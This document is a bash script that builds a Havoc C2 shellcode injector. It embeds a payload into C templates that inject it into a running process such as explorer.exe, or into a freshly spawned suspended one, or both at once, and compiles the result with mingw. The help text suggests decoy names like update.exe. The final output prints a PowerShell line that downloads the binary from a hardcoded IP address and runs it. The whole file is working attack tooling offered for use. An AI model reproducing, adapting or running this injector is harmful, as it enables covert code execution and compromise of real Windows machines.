#!/usr/bin/env bash

set -e

show_help() {
    cat << HELP
Usage: $(basename "$0") [OPTIONS]

Build a standalone Havoc shellcode injector with embedded payload.

OPTIONS:
    -s <path>      Path to shellcode.bin (required)
    -o <path>      Output executable path (required)
    -t <process>   Inject into existing process (default: explorer.exe)
    -p <binary>    Spawn new process and inject (e.g., notepad.exe, calc.exe)
    -d <path>      Havoc installation directory (default: \$HOME/Havoc)
    -h             Show this help message

MODES:
    Use -t only:     Inject into existing process
    Use -p only:     Spawn new process
    Use -t AND -p:   Execute BOTH methods simultaneously (redundancy)
    
EXAMPLES:
    $(basename "$0") -s shellcode.bin -o update.exe
    $(basename "$0") -s shellcode.bin -o beacon.exe -t svchost.exe
    $(basename "$0") -s shellcode.bin -o beacon.exe -p notepad.exe
    $(basename "$0") -s shellcode.bin -o resilient.exe -t explorer.exe -p notepad.exe

HELP
    exit 0
}

HAVOC_DIR="$HOME/Havoc"
SHELLCODE_BIN=""
OUTPUT_EXE=""
TARGET_PROCESS=""
SPAWN_BINARY=""
MODE=""

while getopts "s:o:t:p:d:h" opt; do
    case $opt in
        s) SHELLCODE_BIN="$OPTARG" ;;
        o) OUTPUT_EXE="$OPTARG" ;;
        t) TARGET_PROCESS="$OPTARG" ;;
        p) SPAWN_BINARY="$OPTARG" ;;
        d) HAVOC_DIR="$OPTARG" ;;
        h) show_help ;;
        *) show_help ;;
    esac
done

if [ -z "$SHELLCODE_BIN" ] || [ -z "$OUTPUT_EXE" ]; then
    echo "Error: -s (shellcode) and -o (output) are required"
    echo "Run with -h for help"
    exit 1
fi

if [ -n "$TARGET_PROCESS" ] && [ -n "$SPAWN_BINARY" ]; then
    MODE="both"
elif [ -n "$TARGET_PROCESS" ]; then
    MODE="inject"
elif [ -n "$SPAWN_BINARY" ]; then
    MODE="spawn"
else
    TARGET_PROCESS="explorer.exe"
    MODE="inject"
    echo "[+] No target specified, defaulting to: -t explorer.exe"
fi

if [ ! -f "$SHELLCODE_BIN" ]; then
    echo "Error: Shellcode file not found: $SHELLCODE_BIN"
    exit 1
fi

if [ ! -d "$HAVOC_DIR" ]; then
    echo "Error: Havoc directory not found: $HAVOC_DIR"
    exit 1
fi

COMPILER="$HAVOC_DIR/data/x86_64-w64-mingw32-cross/bin/x86_64-w64-mingw32-gcc"
if [ ! -x "$COMPILER" ]; then
    echo "Error: Compiler not found: $COMPILER"
    exit 1
fi

TEMP_ARRAY="/tmp/shellcode_array_$$.txt"
TEMP_TEMPLATE="/tmp/embedded_injector_$$.c"
TEMP_FINAL="/tmp/embedded_injector_final_$$.c"

if [ "$MODE" = "inject" ]; then
    echo "[+] Mode: Inject into existing process"
    echo "[+] Target process: $TARGET_PROCESS"
elif [ "$MODE" = "spawn" ]; then
    echo "[+] Mode: Spawn new process"
    echo "[+] Spawn binary: $SPAWN_BINARY"
elif [ "$MODE" = "both" ]; then
    echo "[+] Mode: Dual execution (inject AND spawn simultaneously)"
    echo "[+] Target process: $TARGET_PROCESS"
    echo "[+] Spawn binary: $SPAWN_BINARY"
fi

echo "[+] Converting shellcode to C array format..."
xxd -p "$SHELLCODE_BIN" | tr -d '\n' | sed 's/../0x&, /g' | sed 's/, $//' | fold -w 78 > "$TEMP_ARRAY"

echo "[+] Generating C template..."

if [ "$MODE" = "inject" ]; then
    cat > "$TEMP_TEMPLATE" << 'CEOF'
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <string.h>

unsigned char shellcode[] = {
SHELLCODE_BYTES_HERE
};

DWORD FindTargetPID() {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;
    
    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(pe);
    
    if (!Process32First(snap, &pe)) {
        CloseHandle(snap);
        return 0;
    }
    
    do {
        if (_stricmp(pe.szExeFile, "TARGET_PROCESS_HERE") == 0) {
            CloseHandle(snap);
            return pe.th32ProcessID;
        }
    } while (Process32Next(snap, &pe));
    
    CloseHandle(snap);
    return 0;
}

int main() {
    DWORD pid = FindTargetPID();
    if (!pid) return 1;
    
    size_t size = sizeof(shellcode);
    
    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProc) return 2;
    
    LPVOID addr = VirtualAllocEx(hProc, NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!addr) {
        CloseHandle(hProc);
        return 3;
    }
    
    WriteProcessMemory(hProc, addr, shellcode, size, NULL);
    
    HANDLE hThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)addr, NULL, 0, NULL);
    if (!hThread) {
        CloseHandle(hProc);
        return 4;
    }
    
    CloseHandle(hThread);
    CloseHandle(hProc);
    
    return 0;
}
CEOF
    echo "[+] Embedding shellcode and target process into template..."
    awk '/SHELLCODE_BYTES_HERE/ {system("cat '"$TEMP_ARRAY"'"); next} {print}' "$TEMP_TEMPLATE" | sed "s/TARGET_PROCESS_HERE/$TARGET_PROCESS/g" > "$TEMP_FINAL"

elif [ "$MODE" = "spawn" ]; then
    cat > "$TEMP_TEMPLATE" << 'CEOF'
#include <windows.h>
#include <stdio.h>
#include <string.h>

unsigned char shellcode[] = {
SHELLCODE_BYTES_HERE
};

int main() {
    STARTUPINFO si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    
    char target[] = "SPAWN_BINARY_HERE";
    
    if (!CreateProcess(NULL, target, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        return 1;
    }
    
    size_t size = sizeof(shellcode);
    
    LPVOID addr = VirtualAllocEx(pi.hProcess, NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!addr) {
        TerminateProcess(pi.hProcess, 0);
        return 2;
    }
    
    if (!WriteProcessMemory(pi.hProcess, addr, shellcode, size, NULL)) {
        TerminateProcess(pi.hProcess, 0);
        return 3;
    }
    
    HANDLE hThread = CreateRemoteThread(pi.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)addr, NULL, 0, NULL);
    if (!hThread) {
        TerminateProcess(pi.hProcess, 0);
        return 4;
    }
    
    CloseHandle(hThread);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    
    return 0;
}
CEOF
    echo "[+] Embedding shellcode and spawn binary into template..."
    awk '/SHELLCODE_BYTES_HERE/ {system("cat '"$TEMP_ARRAY"'"); next} {print}' "$TEMP_TEMPLATE" | sed "s|SPAWN_BINARY_HERE|$SPAWN_BINARY|" > "$TEMP_FINAL"

elif [ "$MODE" = "both" ]; then
    cat > "$TEMP_TEMPLATE" << 'CEOF'
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <string.h>

unsigned char shellcode[] = {
SHELLCODE_BYTES_HERE
};

DWORD FindTargetPID() {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;
    
    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(pe);
    
    if (!Process32First(snap, &pe)) {
        CloseHandle(snap);
        return 0;
    }
    
    do {
        if (_stricmp(pe.szExeFile, "TARGET_PROCESS_HERE") == 0) {
            CloseHandle(snap);
            return pe.th32ProcessID;
        }
    } while (Process32Next(snap, &pe));
    
    CloseHandle(snap);
    return 0;
}

DWORD WINAPI InjectExistingThread(LPVOID param) {
    DWORD pid = FindTargetPID();
    if (!pid) return 1;
    
    size_t size = sizeof(shellcode);
    
    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProc) return 2;
    
    LPVOID addr = VirtualAllocEx(hProc, NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!addr) {
        CloseHandle(hProc);
        return 3;
    }
    
    WriteProcessMemory(hProc, addr, shellcode, size, NULL);
    
    HANDLE hThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)addr, NULL, 0, NULL);
    if (!hThread) {
        CloseHandle(hProc);
        return 4;
    }
    
    CloseHandle(hThread);
    CloseHandle(hProc);
    
    return 0;
}

DWORD WINAPI SpawnAndInjectThread(LPVOID param) {
    STARTUPINFO si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    
    char target[] = "SPAWN_BINARY_HERE";
    
    if (!CreateProcess(NULL, target, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        return 1;
    }
    
    size_t size = sizeof(shellcode);
    
    LPVOID addr = VirtualAllocEx(pi.hProcess, NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!addr) {
        TerminateProcess(pi.hProcess, 0);
        return 2;
    }
    
    if (!WriteProcessMemory(pi.hProcess, addr, shellcode, size, NULL)) {
        TerminateProcess(pi.hProcess, 0);
        return 3;
    }
    
    HANDLE hThread = CreateRemoteThread(pi.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)addr, NULL, 0, NULL);
    if (!hThread) {
        TerminateProcess(pi.hProcess, 0);
        return 4;
    }
    
    CloseHandle(hThread);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    
    return 0;
}

int main() {
    HANDLE threads[2];
    
    threads[0] = CreateThread(NULL, 0, InjectExistingThread, NULL, 0, NULL);
    threads[1] = CreateThread(NULL, 0, SpawnAndInjectThread, NULL, 0, NULL);
    
    if (threads[0] && threads[1]) {
        WaitForMultipleObjects(2, threads, TRUE, INFINITE);
        CloseHandle(threads[0]);
        CloseHandle(threads[1]);
    } else {
        if (threads[0]) {
            WaitForSingleObject(threads[0], INFINITE);
            CloseHandle(threads[0]);
        }
        if (threads[1]) {
            WaitForSingleObject(threads[1], INFINITE);
            CloseHandle(threads[1]);
        }
    }
    
    return 0;
}
CEOF
    echo "[+] Embedding shellcode, target process, and spawn binary into template..."
    awk '/SHELLCODE_BYTES_HERE/ {system("cat '"$TEMP_ARRAY"'"); next} {print}' "$TEMP_TEMPLATE" | sed "s/TARGET_PROCESS_HERE/$TARGET_PROCESS/g" | sed "s|SPAWN_BINARY_HERE|$SPAWN_BINARY|" > "$TEMP_FINAL"
fi

echo "[+] Compiling with Havoc mingw toolchain..."
"$COMPILER" -o "$OUTPUT_EXE" "$TEMP_FINAL" -s

rm -f "$TEMP_ARRAY" "$TEMP_TEMPLATE" "$TEMP_FINAL"

if [ -f "$OUTPUT_EXE" ]; then
    SIZE=$(stat -f%z "$OUTPUT_EXE" 2>/dev/null || stat -c%s "$OUTPUT_EXE" 2>/dev/null)
    BASENAME=$(basename "$OUTPUT_EXE")
    echo "[+] Success! Compiled: $OUTPUT_EXE ($SIZE bytes)"
    if [ "$MODE" = "inject" ]; then
        echo "[+] Mode: Inject into existing $TARGET_PROCESS"
    elif [ "$MODE" = "spawn" ]; then
        echo "[+] Mode: Spawn $SPAWN_BINARY"
    elif [ "$MODE" = "both" ]; then
        echo "[+] Mode: Dual execution - both methods run simultaneously"
    fi
    echo "[+] Deploy with: IWR -Uri http://100.89.23.94:8002/$BASENAME -OutFile C:\\tmp\\$BASENAME; cd C:\\tmp; .\\$BASENAME"
else
    echo "[-] Compilation failed"
    exit 1
fi
